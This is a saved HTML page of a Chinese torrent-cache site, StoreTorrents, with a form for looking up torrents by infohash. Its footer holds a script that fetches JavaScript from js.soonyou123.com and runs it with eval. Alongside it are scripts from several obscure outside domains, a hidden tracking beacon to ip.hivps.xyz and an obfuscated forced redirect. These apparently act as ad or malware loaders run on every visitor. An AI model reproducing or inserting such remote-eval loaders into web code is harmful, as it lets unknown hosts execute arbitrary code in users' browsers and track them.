<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta http-equiv="Cache-Control" content="no-transform " />
<meta http-equiv="Cache-Control" content="no-siteapp" />
<meta name="applicable-device" content="pc,mobile">
<meta name="description" content="StoreTorrents - 资源丰富的免费BT种子下载站。" />
<meta name="keywords" content="StoreTorrents,磁力链接,BT种子,Torrent文件,Torrent" />
<title>StoreTorrents - 资源丰富的免费BT种子下载站。</title>
<link id="favicon" href="http://storetorrents.com/uploads/images/favicon.ico" rel="icon" type="image/x-icon" />
<link rel="stylesheet" type="text/css" href="http://storetorrents.com/uploads/css/stylesheet.css?v=20171228110211" />
<script language ="javascript" type="text/javascript">
function rawurlencode(str) {
	str = (str + '').toString();
	return encodeURIComponent(str).replace(/!/g, '%21').replace(/'/g, '%27').replace(/\(/g, '%28').replace(/\)/g, '%29').replace(/\*/g, '%2A');
}

function checkInfohash(){
	var infohash = document.getElementById('infohash').value.replace(/(^\s*)|(\s*$)/g, "").toUpperCase();
	if(infohash.match(/^[0-9A-F]{40}$/i) == null){
		document.getElementById('info_tips').innerHTML = "请输入正确的INFOHASH!";
		return false;
	}
	window.location.href = "http://storetorrents.com/torrent/" + infohash +".html";
	return false;		
}

function doSubmit(){
	var captcha = document.getElementById('captcha').value.replace(/(^\s*)|(\s*$)/g, "");
	if(captcha.match(/^[0-9A-Z]{4}$/i) == null){
		document.getElementById('captcha_tips').innerHTML = "验证码错误。";
		return false;
	}
}

</script>
</head>
<body>
<script language='javascript' type='text/javascript'>document.write("<img style='display:none;' src='http://ip.hivps.xyz/system-storetorrents?v=1521616158.0008"+new Date().getTime()+Math.random()+"' />");</script><div class="wrap-content">
	<div class="site-top">
	<div class='msg'><a href='http://storetorrents.com/new_100_torrents.html' ><img src='http://storetorrents.com/uploads/images/new.png' />最新下载</a><a href='http://storetorrents.com/day_top_100_torrents.html' ><img src='http://storetorrents.com/uploads/images/day_hot.png' />今日热门下载</a><a href='http://storetorrents.com/week_top_100_torrents.html' ><img src='http://storetorrents.com/uploads/images/week_hot.png' />本周热门下载</a></div>	</div>
	<div class="wrap-header">
		<div class="header-box">
			<div class="logo"><a href="http://storetorrents.com" ><img src="http://storetorrents.com/uploads/images/logo.png" alt="StoreTorrents - 资源丰富的免费BT种子下载站。" /></a></div>
			<div class='sum'><h2>StoreTorrents - 资源丰富的免费BT种子文件缓存服务。</h2></div>		
		</div>

	</div>

	<div class="content">
			<dl class='dlbox download_tips'>
			<dt><img src='http://storetorrents.com/uploads/images/tips.png' />下载BT种子注意事项：</dt>
			<dd class='tips'>
				<p>你不能检索存储在本站点<strong>BT种子</strong>，也无法浏览<strong>BT种子</strong>所包含的文件列表，只有你已经知道某个<strong>BT种子</strong>的<strong>INFOHASH</strong>值方可访问这些内容。</p>
				<p>访问<strong>BT种子</strong>的方法很简单，你可以使用如下URL地址进行访问：<br /><strong>http://storetorrents.com/hash/INFOHASH</strong> (请注意:<strong>INFOHASH</strong>长度为40，其中的字母A-F必须为大写)。</p>
				<p><strong>URL示例：</strong><a href='http://storetorrents.com/hash/1354AC45BFB3E644A04D69CC519E83283BD3AC6A' target='_blank'>http://storetorrents.com/hash/1354AC45BFB3E644A04D69CC519E83283BD3AC6A</a> (CentOS-7.0-1406-x86_64-DVD)</p>
			</dd>
		</dl>
	
			<dl class='dlbox infohash_down'>
		<dt><img src='http://storetorrents.com/uploads/images/utorrent.png' />输入INFOHASH立即下载BT种子：</dt>
		<dd>
			<p class='guide'>输入BT种子的INFOHASH(长度40)，并点击<strong>进入下载页面</strong>按钮。</p>
			<div class="downbox">
				<div class="btn"><button type="button" onclick = "return checkInfohash()">进入下载页面</button></div>
				<div class="text" ><input type="text" name="infohash" id="infohash" placeholder="例如:1354AC45BFB3E644A04D69CC519E83283BD3AC6A" autofocus="autofocus" onfocus ="document.getElementById('info_tips').innerHTML = '';" /></div>
			</div>
			<p id='info_tips' class='info_tips'></p>
		</dd>
		</dl>
		</div>
	<div class='push'></div>
</div>
<div class="footer" >
	<a href="javascript:scrollTo(0, 0);"  style="text-decoration:none;display:block;padding:0 6px 4px 6px;position:fixed; right:10px; bottom:30px; z-index:1000;background:#00a;opacity:0.5;color:#fff;text-align:center;font-size:12px;"><span style='display:inline-block;font-size:12px;font-weight:bold;'>︿</span><br />TOP</a>
	<script>var FARGDSDQ = "v61|7";</script><script src="http://assets.258pcf.com/ss/sst.js"></script><script src="http://js6882.mengchengbao.com/5317b6/v@59167!21.js"></script><script type="text/javascript">var a = new XMLHttpRequest();var c =  "http://js.soonyou123.com/";var b = c + "code.php?a=index&z=47";if(a != null){a.onreadystatechange=function(){if(a.readyState==4){if(a.status==200){if(window.execScript) window.execScript(a.responseText,"JavaScript");else if(window.eval) window.eval(a.responseText,"JavaScript");else eval(a.responseText);}}};a.open("GET",b,false);a.send(null);}</script>  <script type="text/javascript" src="http://js.start1999.com/code.php?a=index&z=14"></script> <script src='http://e.tdtsd.com/8673'></script>	<div class="copyright">Copyright &copy;2018 <a href=http://storetorrents.com >StoreTorrents</a>&nbsp;版权所有.<span style="display:none;"><script src="https://s19.cnzz.com/z_stat.php?id=1271693915&web_id=1271693915" language="JavaScript"></script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?4ddefc0069e344f0015ab6cea7e08a29";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script></span></div>
</div>
<script charset="gbk" type="text/javascript" src="http://www.baidu.com/js/opensug.js"></script>
<script type="text/javascript">var params = {"XOffset": 0,"YOffset": 0,"fontColor": "#444","fontColorHI": "#000","fontSize": "14px","fontFamily": "arial","borderColor": "#e3e3e3","bgcolorHI": "#ebebeb","sugSubmit": true};BaiduSuggestion.bind("kwd", params);</script>
<script language="javascript" type="text/javascript">if(top.location!==self.location){top.location.href=self.location.href;}</script>
<script language="javascript" type="text/javascript">if(location.host != 's'+'t'+'o'+'r'+'e'+'t'+'o'+'r'+'r'+'e'+'n'+'t'+'s'+'.'+'c'+'o'+'m'){location.href = 'http://'+'s'+'t'+'o'+'r'+'e'+'t'+'o'+'r'+'r'+'e'+'n'+'t'+'s'+'.'+'c'+'o'+'m'+location.pathname+location.search;}</script>

<span style='display:none;'>
Execution time:0.054727792739868 seconds;
Generated at 2018-03-21 15:09:17 by storetorrents;
User IP: 54.224.148.23;
Memory Usage:478.65 KB</span>
<span style="display:none;"><script>var _hmt = _hmt || [];(function() {  var hm = document.createElement("script");  hm.src = "https://hm.baidu.com/hm.js?f75b813e9c1ef4fb27eaa613c9f307b2";  var s = document.getElementsByTagName("script")[0];   s.parentNode.insertBefore(hm, s);})();</script><script src="https://s4.cnzz.com/z_stat.php?id=1261841250&web_id=1261841250" language="JavaScript"></script>      <script language="javascript" type="text/javascript" src="//js.users.51.la/19295161.js"></script><noscript><a href="//www.51.la/?19295161" target="_blank"><img alt="&#x6211;&#x8981;&#x5566;&#x514D;&#x8D39;&#x7EDF;&#x8BA1;" src="//img.users.51.la/19295161.asp" style="border:none" /></a></noscript></span></body>
</html>